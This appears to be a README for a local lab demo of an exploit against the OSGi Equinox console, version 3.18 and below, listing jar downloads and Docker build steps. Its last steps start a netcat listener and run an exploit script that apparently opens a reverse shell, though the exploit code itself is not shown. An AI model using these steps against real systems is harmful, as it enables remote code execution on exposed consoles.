# OSGi v3.18 and below

## Demo setup
1. Create the resource directory
```bash
mkdir -p ./resources/jarfiles
```
2. Download the [OSGi 3.18](https://download.eclipse.org/equinox/drops/R-4.28-202306050440/download.php?dropFile=org.eclipse.osgi_3.18.400.v20230509-2241.jar) to the folder created above and rename it to `org.eclipse.osgi_3.18.jar`
3. Download the [Equinox Console 1.4](https://download.eclipse.org/equinox/drops/R-4.28-202306050440/download.php?dropFile=org.eclipse.equinox.console_1.4.500.v20211021-1418.jar) to the folder created above and rename it to `org.eclipse.equinox.console_1.4.jar`
4. Download the [OSGi Services 3.11](https://download.eclipse.org/equinox/drops/R-4.28-202306050440/download.php?dropFile=org.eclipse.osgi.services_3.11.100.v20221006-1531.jar) to the folder created above and rename it to `org.eclipse.services_3.11.jar`
5. Download the [OSGi Util 3.7](https://download.eclipse.org/equinox/drops/R-4.28-202306050440/download.php?dropFile=org.eclipse.osgi.util_3.7.200.v20230103-1101.jar) to the folder created above and rename it to `org.eclipse.util_3.7.jar`
6. Download the [Felix Gogo Command 1.1.2](https://download.eclipse.org/equinox/drops/R-4.28-202306050440/download.php?dropFile=org.apache.felix.gogo.command_1.1.2.jar) to the folder created above and rename it to `org.apache.felix.gogo.command_1.1.2.jar`
7. Download the [Felix Gogo Runtime 1.1.6](https://download.eclipse.org/equinox/drops/R-4.28-202306050440/download.php?dropFile=org.apache.felix.gogo.runtime_1.1.6.jar) to the folder created above and rename it to `org.apache.felix.gogo.runtime_1.1.6.jar`
8. Download the [Felix Gogo Shell 1.1.4](https://download.eclipse.org/equinox/drops/R-4.28-202306050440/download.php?dropFile=org.apache.felix.gogo.shell_1.1.4.jar) to the folder created above and rename it to `org.apache.felix.gogo.shell_1.1.4.jar`
9. Build OSGi image
```bash
docker build -t osgi_v3.18 .
```
10. Start OSGi container
```bash
docker run --network="host" -it --rm osgi_v3.18
```
11. Set up a netcat listener
```bash
nc -nvlp 4444
```
12. Run the exploit
```bash
python exploit.py --rhost=localhost --rport=1337 --lhost=localhost --lport=4444
```
## Resources
[Latest OSGi and dependencies](https://download.eclipse.org/equinox/drops/R-4.28-202306050440/)
